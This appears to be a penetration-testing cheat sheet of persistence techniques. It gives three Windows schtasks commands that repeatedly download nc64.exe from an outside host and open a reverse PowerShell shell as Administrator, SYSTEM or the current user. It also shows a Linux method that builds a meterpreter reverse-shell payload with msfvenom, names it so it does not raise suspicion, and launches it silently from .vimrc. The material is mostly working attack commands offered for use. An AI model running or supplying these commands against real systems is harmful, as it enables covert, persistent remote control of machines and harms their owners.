## Technique: Scheduled Tasks (Windows)

To create a scheduled task that runs every 3 minutes, as Administrator, downloads nc64.exe and sends a reverse shell (PowerShell x64) from the target machine

```powershell
schtasks /create /ru "Administrator" /rp "password" /tn "Payback1" /sc minute /mo 3 /tr "powershell.exe -c wget http://192.168.14.10/nc64.exe -o C:\users\Public\nc64.exe;C:\Users\Public\nc64.exe 192.168.14.10 8080 -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
```

To create a scheduled task that runs every 3 minutes, as NT Authority/SYSTEM, downloads nc64.exe and sends a reverse shell (PowerShell x64) from the target machine

```powershell
schtasks /create /ru "NT Authority\SYSTEM" /tn "Payback1" /sc minute /mo 3 /tr "powershell.exe -c wget http://192.168.14.10/nc64.exe -o C:\users\Public\nc64.exe;C:\Users\Public\nc64.exe 192.168.14.10 8080 -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
```

To create a scheduled task that runs every 3 minutes, as current user, downloads nc64.exe and sends a reverse shell (PowerShell x64) from the target machine

```powershell
schtasks /create /tn "Payback1" /sc minute /mo 3 /tr "powershell.exe -c wget http://192.168.14.10/nc64.exe -o C:\users\Public\nc64.exe;C:\Users\Public\nc64.exe 192.168.14.10 8080 -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
```
## Technique: Reverse shell via Vim (Linux)

The following works when a local user can run vim as sudo:

- Create a meterpreter payload in ELF format. Choose the name that doesn't raise suspicion:
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.0.188 LPORT=4444 -f elf > .vim_rc
```
- Upload it to the target machine (/home/<username> should be ideal)
- Add the following line in .vimrc file (if it does not exist, create one). This is a vim configuration file and loads everytime vim / vi is started.

```bash
:silent !/home/ptlabmachine/.vim_rc &
```  
- The above command will run ```.vim_rc``` file in silent mode as a job in the background. This is necessary to eliminate all user interruptions while executing the reverse shell code.  
